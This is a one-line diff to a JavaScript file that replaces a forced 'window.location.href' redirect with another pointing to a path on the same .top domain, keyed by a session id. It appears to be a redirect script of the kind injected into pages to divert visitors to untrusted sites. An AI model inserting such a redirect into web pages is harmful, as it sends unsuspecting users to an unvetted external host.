@@ -1,1 +1,1 @@
-window.location.href = "https://piosity.top/NPFMm/go?sid=7747";
+window.location.href = "https://piosity.top/aiY/go?sid=7747";
